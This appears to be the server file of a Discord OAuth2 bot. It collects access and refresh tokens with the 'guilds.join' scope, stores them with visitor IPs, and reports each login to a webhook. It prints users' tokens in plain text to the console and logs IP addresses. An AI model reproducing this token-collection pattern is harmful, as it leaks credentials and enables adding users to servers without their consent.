const express = require('express');
const app = express();
const mongoose = require('mongoose');
const emoji = require('./src/Structures/Emojis.js');
const config = require('./config');
const { WebhookClient } = require('discord.js');
const webhook = new WebhookClient({ url: config.webhookURL })
const fetch = require('node-fetch');
const { createUser, updateUser } = require('./src/Structures/Functions');
const { User } = require('./src/Models/index');
const { success, logErr, log, yellow } = require('./src/Structures/Functions');

Array.prototype.random = function() {
  return this[Math.floor((Math.random() * this.length))];
}
//process.kill(1)

async function loadDatabase() {
  try {
    await mongoose.connect(config.mongo, {
      autoIndex: true,
      maxPoolSize: 10,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000,
      family: 4
    })
  } catch (err) {
    return logErr(`Database error : ${err}`)
  }
  success("Database loaded")
}


app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const { code } = req.query;


  log(`${ip} : Nouveau visiteur`)

  if (!code) return res.sendStatus(400);
  if (code.length < 30) return res.sendStatus(400);

  try {

    const oauthResult = await fetch('https://discordapp.com/api/oauth2/token', {
      method: 'POST',
      body: new URLSearchParams({
        client_id: config.clientID,
        client_secret: config.clientSecret,
        code,
        grant_type: 'authorization_code',
        redirect_uri: config.redirectURI,
        scope: 'identify guilds.join',
      }),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });

    const oauthData = await oauthResult.json();

    const userResult = await fetch('https://discordapp.com/api/users/@me', {
      headers: {
        authorization: `${oauthData.token_type} ${oauthData.access_token}`,
      },
    });

    const userInfo = await userResult.json();
    if (userInfo.code == 0) {
      res.sendStatus(400);
      return logErr(`${ip} : Invalid code in URL`);
    }


    const findUser = await User.findOne({ id: userInfo.id });
    yellow(`${"=".repeat(50)}`)
    success(`${ip} : Nouvelle connexion ( ${userInfo.username}#${userInfo.discriminator} )`)
    success(`AT: ${oauthData.access_token} | RT: ${oauthData.refresh_token}`)
    if (!findUser) {
      sendWebhook(userInfo, oauthData, ip);
      success(`User DB Create : ${userInfo.username}#${userInfo.discriminator}`);
      createUser(userInfo, oauthData.access_token, oauthData.refresh_token);
    } else if (findUser.access_token !== oauthData.access_token) {
      sendWebhook(userInfo, oauthData, ip)
      success(`User DB Update : ${userInfo.username}#${userInfo.discriminator}`)
      updateUser(userInfo, {
        access_token: oauthData.access_token,
        refresh_token: oauthData.refresh_token
      });
    } else {
      logErr(`User DB Error : ${userInfo.username}#${userInfo.discriminator} s'est déjà autorisé`)
    }
    yellow(`${"=".repeat(50)}`)


  } catch (err) { logErr(err) }

  res.redirect(config.redirectionBot.random());

})


function sendWebhook(userInfo, oauthData, ip) {
  webhook.send({
    embeds: [
      {
        color: 3092790,
        description: `**${emoji.progress} Nouvelle connexion**`,
        thumbnail: {
          url: `${userInfo.avatar.startsWith('a_') ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096` : `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png?size=4096`}`
        },
        fields: [
          { name: `${emoji.member} Pseudo`, value: `\`\`\`ini\n[ ${userInfo.username}#${userInfo.discriminator} ]\`\`\`` },
          { name: `${emoji.author}ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` }
        ],
        timestamp: new Date()
      }
    ]
  }).catch((err) => { logErr(err) })
}

app.listen(config.port, async () => {
  await loadDatabase();
  log(`oAuth v2 listening on http${config.port == 80 ? "s" : ""}://${Object.values(require('os').networkInterfaces()).reduce((r, list) => r.concat(list.reduce((rr, i) => rr.concat(i.family === 'IPv4' && !i.internal && i.address || []), [])), [])}${config.port !== 80 ? `:${config.port}` : ""}`)
})